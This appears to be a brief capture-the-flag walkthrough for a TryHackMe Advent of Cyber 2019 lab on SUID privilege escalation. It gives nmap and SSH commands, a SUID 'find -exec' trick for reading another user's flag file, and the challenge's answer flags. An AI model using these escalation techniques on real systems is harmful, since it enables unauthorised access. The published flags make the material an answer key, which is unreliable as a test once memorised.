# Advent of Cyber 01 - 2019
# Day 08
# SUID Shenanigans


> Machine IP : `10.10.12.246`

nmap scan : 
```
nmap -A 10.10.12.246
```

connect to ssh :
```
ssh holly@10.10.12.246 -p 65534
```

reading the igor/flag1.txt :
```
find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;
```

find SUID set bit :
```
find /usr -user root -perm /4000
```

we see that system-control is set with SUID


| Que$t1on$ | An$wer$ |
|-----------|---------|
| What port is SSH running on ? | 65534 |
| Find and run a file as igor. Read the file /home/igor/flag1.txt | THM{d3f0708bdd9accda7f937d013eaf2cd8} |
| Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt | THM{8c8211826239d849fa8d6df03749c3a2} |
